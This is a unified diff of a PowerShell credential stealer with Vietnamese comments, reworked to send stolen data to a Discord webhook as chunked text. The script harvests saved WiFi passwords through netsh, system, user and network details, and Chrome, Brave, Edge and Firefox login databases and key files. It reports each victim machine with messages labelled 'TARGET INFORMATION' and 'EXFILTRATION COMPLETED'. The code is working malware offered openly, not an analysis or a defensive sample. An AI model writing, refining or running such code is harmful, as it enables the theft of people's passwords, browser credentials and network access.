@@ -18,30 +18,57 @@ try {
 } catch {}
 
 # ==========================================
-# DISCORD WEBHOOK FUNCTION
+# DISCORD WEBHOOK FUNCTION - GỬI TEXT
 # ==========================================
-function Send-DiscordFile {
-    param([string]$FilePath, [string]$Description = "")
-    if (-Not (Test-Path $FilePath)) { 
-        Write-Host "[-] File not found: $FilePath"
-        return 
+function Send-DiscordText {
+    param([string]$Title, [string]$Content)
+    
+    if ([string]::IsNullOrWhiteSpace($Content)) {
+        Write-Host "[-] No content for: $Title"
+        return
     }
+    
+    # Discord giới hạn 2000 ký tự mỗi message
+    if ($Content.Length -gt 1900) {
+        $Content = $Content.Substring(0, 1900) + "...`n[TRUNCATED]"
+    }
+    
+    $payload = @{
+        content = "**📌 $Title**`n```$Content```"
+    } | ConvertTo-Json
+    
     try {
-        $fileName = Split-Path $FilePath -Leaf
-        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
-        $base64Content = [Convert]::ToBase64String($fileBytes)
-        $payload = @{
-            content = $Description
-            files = @(@{ name = $fileName; content = $base64Content })
-        } | ConvertTo-Json -Depth 10
-        Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
-        Write-Host "[+] Sent: $fileName"
+        Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -ErrorAction Stop
+        Write-Host "[+] Sent: $Title"
     } catch {
-        Write-Host "[-] Failed to send: $fileName"
+        Write-Host "[-] Failed to send: $Title - $_"
     }
 }
 
-# Function to copy browser files (dùng PowerShell thuần)
+# Hàm gửi nhiều phần (nếu nội dung dài)
+function Send-DiscordLongText {
+    param([string]$Title, [string]$Content, [int]$MaxLength = 1900)
+    
+    if ([string]::IsNullOrWhiteSpace($Content)) { return }
+    
+    if ($Content.Length -le $MaxLength) {
+        Send-DiscordText $Title $Content
+        return
+    }
+    
+    # Chia nhỏ nội dung
+    $parts = [math]::Ceiling($Content.Length / $MaxLength)
+    for ($i = 0; $i -lt $parts; $i++) {
+        $start = $i * $MaxLength
+        $length = [Math]::Min($MaxLength, $Content.Length - $start)
+        $partContent = $Content.Substring($start, $length)
+        $partTitle = "$Title (Part $($i+1)/$parts)"
+        Send-DiscordText $partTitle $partContent
+        Start-Sleep -Milliseconds 500
+    }
+}
+
+# Function to copy browser files
 function CopyBrowserFiles($browserName, $browserDir, $filesToCopy) {
     $browserDestDir = Join-Path -Path $destDir -ChildPath $browserName
     if (-Not (Test-Path $browserDir)) {
@@ -55,11 +82,9 @@ function CopyBrowserFiles($browserName, $browserDir, $filesToCopy) {
         $source = Join-Path -Path $browserDir -ChildPath $file
         if (Test-Path $source) {
             try {
-                # Dùng Copy-Item với force
                 Copy-Item -Path $source -Destination $browserDestDir -Force -ErrorAction Stop
                 Write-Host "$browserName - Copied: $file"
             } catch {
-                # Nếu lỗi, thử dùng File.Copy
                 try {
                     [System.IO.File]::Copy($source, (Join-Path $browserDestDir $file), $true)
                     Write-Host "$browserName - Copied (alternative): $file"
@@ -70,6 +95,32 @@ function CopyBrowserFiles($browserName, $browserDir, $filesToCopy) {
         } else {
             Write-Host "$browserName - Not found: $file"
         }
+    }
+}
+
+# Hàm đọc file và trả về nội dung (xử lý file nhị phân)
+function Get-FileContentAsText {
+    param([string]$FilePath)
+    
+    if (-not (Test-Path $FilePath)) { return $null }
+    
+    try {
+        $bytes = [System.IO.File]::ReadAllBytes($FilePath)
+        # Chỉ lấy 5000 bytes đầu để tránh quá dài
+        if ($bytes.Length -gt 5000) {
+            $bytes = $bytes[0..4999]
+            $isTruncated = $true
+        } else {
+            $isTruncated = $false
+        }
+        
+        $text = [System.Text.Encoding]::UTF8.GetString($bytes)
+        if ($isTruncated) {
+            $text += "`n[FILE TRUNCATED - Original size: $([math]::Round((Get-Item $FilePath).Length/1KB, 2)) KB]"
+        }
+        return $text
+    } catch {
+        return "[Cannot read file: $_]"
     }
 }
 
@@ -139,45 +190,88 @@ $wifiFile = "$destDir\WiFi_Details.txt"
 "WiFi Passwords for $env:COMPUTERNAME" | Out-File $wifiFile -Append
 "Extracted: $(Get-Date)" | Out-File $wifiFile -Append
 "="*60 | Out-File $wifiFile -Append
+"" | Out-File $wifiFile -Append
 
 $wifiProfiles = netsh wlan show profiles | Select-String ":\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }
 foreach ($profile in $wifiProfiles) {
     $profileDetails = netsh wlan show profile name="$profile" key=clear
     $keyContent = ($profileDetails | Select-String "Key Content\s+:\s+(.*)$").Matches.Groups[1].Value
     if (-not $keyContent) { $keyContent = "No password (Open network)" }
-    "[$profile] $keyContent" | Out-File $wifiFile -Append
+    "$profile : $keyContent" | Out-File $wifiFile -Append
 }
 
 # ==========================================
-# 7. GỬI DỮ LIỆU QUA DISCORD
+# 7. GỬI DỮ LIỆU QUA DISCORD (DẠNG TEXT)
 # ==========================================
 Write-Host "[+] Sending data to Discord..."
 
-# Gửi WiFi
-if (Test-Path $wifiFile) {
-    Send-DiscordFile $wifiFile "WiFi Passwords"
+# Gửi thông báo bắt đầu
+Send-DiscordText "TARGET INFORMATION" "Computer: $env:COMPUTERNAME`nUser: $env:USERNAME`nTime: $(Get-Date)"
+
+# Gửi WiFi passwords
+$wifiContent = Get-Content $wifiFile -Raw -ErrorAction SilentlyContinue
+if ($wifiContent) {
+    Send-DiscordLongText "WiFi Passwords" $wifiContent
+} else {
+    Send-DiscordText "WiFi Passwords" "No WiFi profiles found"
 }
 
-# Gửi System Info
-Send-DiscordFile "$sysInfoDir\computer_info.txt" "Computer Info"
-Send-DiscordFile "$sysInfoDir\local_users.txt" "Local Users"
+# Gửi Computer Info
+$computerInfo = Get-Content "$sysInfoDir\computer_info.txt" -Raw -ErrorAction SilentlyContinue
+if ($computerInfo) {
+    Send-DiscordLongText "Computer Information" $computerInfo
+}
 
-# Gửi từng trình duyệt (nếu có dữ liệu)
+# Gửi Local Users
+$localUsers = Get-Content "$sysInfoDir\local_users.txt" -Raw -ErrorAction SilentlyContinue
+if ($localUsers) {
+    Send-DiscordLongText "Local Users" $localUsers
+}
+
+# Gửi Network Config
+$networkConfig = Get-Content "$sysInfoDir\network_config.txt" -Raw -ErrorAction SilentlyContinue
+if ($networkConfig) {
+    Send-DiscordLongText "Network Configuration" $networkConfig
+}
+
+# Gửi Process List (tóm tắt)
+$processes = Get-Process | Sort-Object -Property CPU -Descending | Select-Object -First 30 | Out-String
+Send-DiscordText "Top 30 Processes by CPU" $processes
+
+# Gửi browser credentials
 $browsers = @("Chrome", "Brave", "Edge", "Firefox")
 foreach ($browser in $browsers) {
     $browserDir = "$destDir\$browser"
     if (Test-Path $browserDir) {
-        $files = Get-ChildItem $browserDir -File
-        if ($files.Count -gt 0) {
-            $zipPath = "$env:TEMP\$browser-$env:USERNAME.zip"
-            Compress-Archive -Path "$browserDir\*" -DestinationPath $zipPath -Force
-            if (Test-Path $zipPath) {
-                Send-DiscordFile $zipPath "$browser Credentials"
-                Remove-Item $zipPath -Force
-            }
+        $loginDataFile = "$browserDir\Login Data"
+        if (Test-Path $loginDataFile) {
+            $content = Get-FileContentAsText $loginDataFile
+            Send-DiscordLongText "$browser - Login Data (Raw)" $content
+        }
+        
+        $localStateFile = "$browserDir\Local State"
+        if (Test-Path $localStateFile) {
+            $content = Get-FileContentAsText $localStateFile
+            Send-DiscordLongText "$browser - Local State (Decryption Key)" $content
+        }
+        
+        # Firefox specific
+        $loginsJson = "$browserDir\logins.json"
+        if (Test-Path $loginsJson) {
+            $content = Get-FileContentAsText $loginsJson
+            Send-DiscordLongText "Firefox - logins.json" $content
+        }
+        
+        $key4db = "$browserDir\key4.db"
+        if (Test-Path $key4db) {
+            $content = Get-FileContentAsText $key4db
+            Send-DiscordLongText "Firefox - key4.db (Partial)" $content
         }
     }
 }
+
+# Gửi thông báo hoàn tất
+Send-DiscordText "EXFILTRATION COMPLETED" "Target: $env:COMPUTERNAME`nUser: $env:USERNAME`nCompleted: $(Get-Date)"
 
 # ==========================================
 # 8. DỌN DẸP
